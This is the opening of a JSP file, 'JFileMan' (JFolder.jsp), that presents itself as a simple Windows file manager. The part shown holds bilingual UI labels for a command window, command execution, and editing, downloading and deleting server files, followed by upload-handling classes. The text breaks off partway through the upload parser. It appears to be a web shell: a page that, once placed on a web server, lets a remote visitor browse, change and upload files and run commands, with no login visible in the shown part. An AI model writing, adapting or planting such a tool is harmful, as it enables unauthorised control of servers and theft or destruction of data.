<%
/**
JFileMan V1.0  windows platform
@Filename： JFolder.jsp 
@Description： 一个简单的系统文件目录显示程序，类似于资源管理器，提供基本的文件操作，不过功能弱多了。
@Author： Steven Cee
@Email ： cqq1978@Gmail.com
@Bugs  :  下载时，中文文件名无法正常显示；Unix操作系统上传
*/
%>
<%@page errorPage="/"%>
<%@page contentType="text/html;charset=gb2312"%>
<%@page import="java.io.*,java.util.*,java.net.*" %>
<%!
private final static int languageNo=1; //Language,0 : Chinese; 1:English
String strThisFile="JFileMan.jsp";
String strSeparator = File.separator;
String[] authorInfo={" <font color=red> 写的不好，将就着用吧 - - by 慈勤强 http://www.topronet.com </font>"," <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>"};
String[] strFileManage   = {"文 件 管 理","File Management"};
String[] strCommand      = {"CMD 命 令","Command Window"};
String[] strSysProperty  = {"系 统 属 性","System Property"};
String[] strHelp         = {"帮 助","Help"};
String[] strParentFolder = {"上级目录","Parent Folder"};
String[] strCurrentFolder= {"当前目录","Current Folder"};
String[] strDrivers      = {"驱动器","Drivers"};
String[] strFileName     = {"文件名称","File Name"};
String[] strFileSize     = {"文件大小","File Size"};
String[] strLastModified = {"最后修改","Last Modified"};
String[] strFileOperation= {"文件操作","Operations"};
String[] strFileEdit     = {"修改","Edit"};
String[] strFileDown     = {"下载","Download"};
String[] strFileCopy     = {"复制","Move"};
String[] strFileDel      = {"删除","Delete"};
String[] strExecute      = {"执行","Execute"};
String[] strBack         = {"返回","Back"};
String[] strFileSave     = {"保存","Save"};

public class FileHandler
{
	private String strAction="";
	private String strFile="";
	void FileHandler(String action,String f)
	{
	
	}
}

public static class UploadMonitor {

		static Hashtable uploadTable = new Hashtable();

		static void set(String fName, UplInfo info) {
			uploadTable.put(fName, info);
		}

		static void remove(String fName) {
			uploadTable.remove(fName);
		}

		static UplInfo getInfo(String fName) {
			UplInfo info = (UplInfo) uploadTable.get(fName);
			return info;
		}
}

public class UplInfo {

		public long totalSize;
		public long currSize;
		public long starttime;
		public boolean aborted;

		public UplInfo() {
			totalSize = 0l;
			currSize = 0l;
			starttime = System.currentTimeMillis();
			aborted = false;
		}

		public UplInfo(int size) {
			totalSize = size;
			currSize = 0;
			starttime = System.currentTimeMillis();
			aborted = false;
		}

		public String getUprate() {
			long time = System.currentTimeMillis() - starttime;
			if (time != 0) {
				long uprate = currSize * 1000 / time;
				return convertFileSize(uprate) + "/s";
			}
			else return "n/a";
		}

		public int getPercent() {
			if (totalSize == 0) return 0;
			else return (int) (currSize * 100 / totalSize);
		}

		public String getTimeElapsed() {
			long time = (System.currentTimeMillis() - starttime) / 1000l;
			if (time - 60l >= 0){
				if (time % 60 >=10) return time / 60 + ":" + (time % 60) + "m";
				else return time / 60 + ":0" + (time % 60) + "m";
			}
			else return time<10 ? "0" + time + "s": time + "s";
		}

		public String getTimeEstimated() {
			if (currSize == 0) return "n/a";
			long time = System.currentTimeMillis() - starttime;
			time = totalSize * time / currSize;
			time /= 1000l;
			if (time - 60l >= 0){
				if (time % 60 >=10) return time / 60 + ":" + (time % 60) + "m";
				else return time / 60 + ":0" + (time % 60) + "m";
			}
			else return time<10 ? "0" + time + "s": time + "s";
		}

	}

	public class FileInfo {

		public String name = null, clientFileName = null, fileContentType = null;
		private byte[] fileContents = null;
		public File file = null;
		public StringBuffer sb = new StringBuffer(100);

		public void setFileContents(byte[] aByteArray) {
			fileContents = new byte[aByteArray.length];
			System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);
		}
}

// A Class with methods used to process a ServletInputStream
public class HttpMultiPartParser {

		private final String lineSeparator = System.getProperty("line.separator", "\n");
		private final int ONE_MB = 1024 * 1;

		public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,
				int clength) throws IllegalArgumentException, IOException {
			if (is == null) throw new IllegalArgumentException("InputStream");
			if (boundary == null || boundary.trim().length() < 1) throw new IllegalArgumentException(
					"\"" + boundary + "\" is an illegal boundary indicator");
			boundary = "--" + boundary;
			StringTokenizer stLine = null, stFields = null;
			FileInfo fileInfo = null;
			Hashtable dataTable = new Hashtable(5);
			String line = null, field = null, paramName = null;
			boolean saveFiles = (saveInDir != null && saveInDir.trim().length() > 0);
			boolean isFile = false;
			if (saveFiles) { // Create the required directory (including parent dirs)
				File f = new File(saveInDir);
				f.mkdirs();
			}
			line = getLine(is);
			if (line == null || !line.startsWith(boundary)) throw new IOException(
					"Boundary not found; boundary = " + boundary + ", line = " + line);
			while (line != null) {
				if (line == null || !line.startsWith(boundary)) return dataTable;
				line = getLine(is);
				if (line == null) return dataTable;
				stLine = new StringTokenizer(line, ";\r\n");
				if (stLine.countTokens() < 2) throw new IllegalArgumentException(
						"Bad data in second line");
				line = stLine.nextToken().toLowerCase();
				if (line.indexOf("form-data") < 0) throw new IllegalArgumentException(
						"Bad data in second line");
				stFields = new StringTokenizer(stLine.nextToken(), "=\"");
				if (stFields.countTokens() < 2) throw new IllegalArgumentException(
						"Bad data in second line");
				fileInfo = new FileInfo();
				stFields.nextToken();
				paramName = stFields.nextToken();
				isFile = false;
				if (stLine.hasMoreTokens()) {
					field = stLine.nextToken();
					stFields = new StringTokenizer(field, "=\"");
					if (stFields.countTokens() > 1) {
						if (stFields.nextToken().trim().equalsIgnoreCase("filename")) {
							fileInfo.name = paramName;
							String value = stFields.nextToken();
							if (value != null && value.trim().length() > 0) {
								fileInfo.clientFileName = value;
								isFile = true;
							}
							else {
								line = getLine(is); // Skip "Content-Type:" line
								line = getLine(is); // Skip blank line
								line = getLine(is); // Skip blank line
								line = getLine(is); // Position to boundary line
								continue;
							}
						}
					}
					else if (field.toLowerCase().indexOf("filename") >= 0) {
						line = getLine(is); // Skip "Content-Type:" line
						line = getLine(is); // Skip blank line
						line = getLine(is); // Skip blank line
						line = getLine(is); // Position to boundary line
						continue;
					}
				}
				boolean skipBlankLine = true;
				if (isFile) {
					line = getLine(is);
					if (line == null) return dataTable;
					if (line.trim().length() < 1) skipBlankLine = false;
					else {
						stLine = new StringTokenizer(line, ": ");
						if (stLine.countTokens() < 2) throw new IllegalArgumentException(
								"Bad data in third line");
						stLine.nextToken(); // Content-Type
						fileInfo.fileContentType = stLine.nextToken();
					}
				}
				if (skipBlankLine) {
					line = getLine(is);
					if (line == null) return dataTable;
				}
				if (!isFile) {
					line = getLine(is);
					if (line == null) return dataTable;
					dataTable.put(paramName, line);
					// If parameter is dir, change saveInDir to dir
					if (paramName.equals